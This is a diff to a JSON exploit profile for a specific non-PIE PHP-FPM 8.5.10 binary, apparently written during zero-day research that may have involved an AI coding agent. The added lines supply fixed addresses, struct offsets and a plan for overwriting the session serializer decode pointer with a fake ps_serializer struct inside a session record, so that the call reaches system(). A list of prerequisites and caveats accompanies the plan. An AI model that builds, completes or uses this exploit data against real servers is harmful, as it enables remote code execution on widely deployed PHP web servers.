@@ -6,10 +6,14 @@
   "php_version": "8.5.10",
   "binary": "/home/davide/ailocal/php/zerodays_1020/build_plainpie/sapi/fpm/php-fpm",
   "build_id": "3d459b79bdd7d0fb8181e21fec72783062e6f6d9",
+  "md5": "825470df6b9fa7d0178a1a9bcf4ce6dc",
+  "size_bytes": 42900672,
   "elf_type": "EXEC",
   "pie": false,
+  "align16": true,
   "image_base": "0x400000",
   "serializer": "php_binary",
+  "md5_lock": "select this profile only when the target binary md5 matches; a mismatch invalidates every offset",
   "structs": {
     "ps_serializer_size": 24,
     "ps_serializer_name": 0,
@@ -29,12 +33,17 @@
     "var_entries_max": 1018,
     "var_dtor_entries_max": 255
   },
+  "ps_globals": "0x14c6000",
   "ps_serializers": {
     "table": "0x14c1b20",
     "terminator": "0x14c1b68",
     "active_serializer_slot": "0x14c6160",
     "active_serializer_ps_globals_offset": "0x160",
     "default_target": "0x14c1b60",
+    "default_handler": "php",
+    "default_php_decode": "0x14c1b48",
+    "default_php_decode_16b_aligned": false,
+    "note": "the default php decode slot is not 16 byte aligned; with session.serialize_handler=php, target ps_serializer_slot and point it at a fake ps_serializer struct in the record",
     "entries": [
       {
         "index": 0,
@@ -62,6 +71,13 @@
       }
     ]
   },
+  "ps_serializer_slot": {
+    "address": "0x14c6160",
+    "ps_globals": "0x14c6000",
+    "offset": "0x160",
+    "aligned_16b": true,
+    "note": "write the fake ps_serializer struct address here; the fake struct is 24 bytes, name at +0, encode at +8, decode at +0x10"
+  },
   "decode_call": {
     "php_session_decode": "0x83db0f",
     "set_len": "0x83db57",
@@ -73,6 +89,8 @@
     "rsi": "ZSTR_LEN session record",
     "note": "the decode pointer is read from ps_globals+0x160 on every decode, so the write is consumed by the forced END update in the same request"
   },
+  "zend_eval_string": "0x9cfd10",
+  "zend_eval_stringl": "0x9cfac1",
   "pre_rinit_path": {
     "php_session_rfc1867_update": "0x841687",
     "php_session_initialize": "0x83fed3",
@@ -133,15 +151,18 @@
     "note": "a heap leak from a static session file that works under ASLR is not solved; the G2 plan needs operator supplied X, P and B0"
   },
   "prerequisites": [
+    "md5 locked: the target binary must match this profile md5",
     "non PIE target so the ps_serializers table is at a fixed address, or a binary base leak",
     "libc base for system, or a fixed call target that accepts (char *, size_t); the fixed target route is not demonstrated",
     "heap addresses X, P and B0 and the exact record length",
     "upload progress enabled with the forced END update in the same request",
     "the plant request must be the immediately preceding request on the same worker",
-    "single shot per plant: RINIT resets BG(unserialize), and the corrupted decode pointer persists until worker restart"
+    "single shot per plant: RINIT resets BG(unserialize), and the corrupted decode pointer persists until worker restart",
+    "with session.serialize_handler=php, target ps_serializer_slot and point it at a fake ps_serializer struct; the php decode slot is not 16 byte aligned"
   ],
   "receipts": {
     "G2": "/tmp/opencode/research/fpmgadget_20261021T211940Z",
+    "V6": "/tmp/opencode/research/veroff_20261021_215718",
     "F8": "/tmp/opencode/research/fpmzend_20261021T203659Z",
     "F11": "/tmp/opencode/research/fpmsurvive_20261021T211316Z",
     "F5": "/tmp/opencode/research/fpmwrite_20261021T201018Z",
@@ -150,6 +171,10 @@
   },
   "caveats": [
     "measured with setarch x86_64 -R; with ASLR on X, P, B0 and the libc base move",
+    "a binary md5 mismatch invalidates every offset",
+    "the default php serializer decode slot is not 16 byte aligned; the PS(serializer) pointer slot plus a fake ps_serializer struct is the target for that handler",
+    "zend_eval_string is not a valid decode target: rsi is ZSTR_LEN and zend_eval_stringl treats a non NULL retval_ptr as a zval and does ZVAL_COPY_VALUE, a wild write for a nonzero length",
+    "5.x cannot reuse this geometry: php_unserialize_data is {first, last, first_dtor, last_dtor}, dtor entries use zval *data[1024] with used_slots at +0x2000 and next at +0x2008, the bound is equality, and BG(unserialize) is a struct not a pointer",
     "the fake P and fake B0 must both fall inside the session record buffer; a wrong X either leaves the plant chain in place or crashes var_push",
     "a wrong record length moves the second decode buffer and can crash the second decode",
     "no claim is made for other session savers, opcache, ZTS or shared pools"
